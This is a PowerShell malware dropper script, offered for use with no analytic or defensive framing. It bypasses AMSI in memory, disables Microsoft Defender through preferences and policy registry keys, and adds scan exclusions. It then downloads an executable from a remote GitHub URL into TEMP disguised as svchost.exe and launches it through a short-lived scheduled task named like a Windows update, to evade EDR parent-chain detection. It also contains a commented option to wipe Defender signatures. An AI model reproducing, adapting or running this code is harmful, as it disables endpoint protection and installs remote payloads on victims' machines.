# dropper_layered.ps1
# run elevated. Tamper Protection must be OFF for Set-MpPreference paths.

$ErrorActionPreference = "SilentlyContinue"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$url  = "https://raw.githubusercontent.com/xdwdeblan888-sys/GHJAJSHAG86gfsdfGGAG/refs/heads/main/Conecter.exe"
$dest = Join-Path $env:TEMP "svchost.exe"

# ─── LAYER 1: AMSI bypass (in-memory, no disk) ───
# patches AmsiScanBuffer in amsi.dll to always return clean
try {
    $a = [Ref].Assembly.GetTypes() | ? { $_.Name -like "*iUtils" }
    $f = $a.GetFields("NonPublic,Static") | ? { $_.Name -like "*Context" }
    $f.SetValue($null, [IntPtr]::Zero)
    $a2 = [Ref].Assembly.GetTypes() | ? { $_.Name -like "*ScriptBlock" }
    $f2 = $a2.GetFields("NonPublic,Static") | ? { $_.Name -like "*Session" }
    $f2.SetValue($null, $null)
} catch {}

# ─── LAYER 2: Defender tamper ───
# A) Preference-level (works if Tamper Protection off)
try {
    Add-MpPreference -ExclusionPath  $env:TEMP        -EA 0
    Add-MpPreference -ExclusionPath  $env:APPDATA     -EA 0
    Add-MpPreference -ExclusionProcess "svchost.exe"  -EA 0
    Set-MpPreference  -DisableRealtimeMonitoring   $true -EA 0
    Set-MpPreference  -DisableBehaviorMonitoring   $true -EA 0
    Set-MpPreference  -DisableScriptScanning       $true -EA 0
    Set-MpPreference  -DisableIOAVProtection       $true -EA 0
    Set-MpPreference  -DisableBlockAtFirstSeen     $true -EA 0
    Set-MpPreference  -MAPSReporting 0                    -EA 0
    Set-MpPreference  -SubmitSamplesConsent 2             -EA 0
} catch {}

# B) Registry-level (survives some TP configs)
try {
    $k = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
    if (!(Test-Path $k)) { New-Item -Path $k -Force | Out-Null }
    New-ItemProperty $k -Name "DisableAntiSpyware"        -Value 1 -PropertyType DWORD -Force -EA 0
    New-ItemProperty $k -Name "DisableAntiVirus"          -Value 1 -PropertyType DWORD -Force -EA 0
    $r = "$k\Real-Time Protection"
    if (!(Test-Path $r)) { New-Item -Path $r -Force | Out-Null }
    @("DisableRealtimeMonitoring","DisableBehaviorMonitoring",
      "DisableOnAccessProtection","DisableScanOnRealtimeEnable") | % {
        New-ItemProperty $r -Name $_ -Value 1 -PropertyType DWORD -Force -EA 0
    }
} catch {}

# C) ASR rule disable (Win10 1903+ / Win11)
try { Set-MpPreference -EnableControlledFolderAccess Disabled -EA 0 } catch {}
try { Add-MpPreference  -AttackSurfaceReductionRules_Ids @() -EA 0 } catch {}

# D) MpCmdRun tamper (nuke signatures if you want)
# & "$env:ProgramFiles\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All

# ─── LAYER 3: delivery (no disk cache, UA spoof) ───
try {
    $wc = New-Object Net.WebClient
    $wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $wc.Proxy = [Net.WebRequest]::DefaultWebProxy
    $wc.DownloadFile($url, $dest)
} catch {}

# fallback: IEX cradle if DownloadFile got flagged
if (!(Test-Path $dest)) {
    try {
        $b = (New-Object Net.WebClient).DownloadData($url)
        [IO.File]::WriteAllBytes($dest, $b)
    } catch {}
}

# ─── LAYER 4: execution ───
# parent is powershell.exe -> some EDR hooks on that chain.
# run via scheduled task to break the parent chain:
try {
    $tn = "WinUpdate$((Get-Random -Min 1000 -Max 9999))"
    $a  = New-ScheduledTaskAction -Execute $dest
    $t  = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)
    $p  = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive
    Register-ScheduledTask -TaskName $tn -Action $a -Trigger $t -Principal $p -Force | Out-Null
    Start-ScheduledTask -TaskName $tn
    Start-Sleep -Seconds 2
    Unregister-ScheduledTask -TaskName $tn -Confirm:$false -EA 0
} catch {
    Start-Process -FilePath $dest -WindowStyle Hidden
}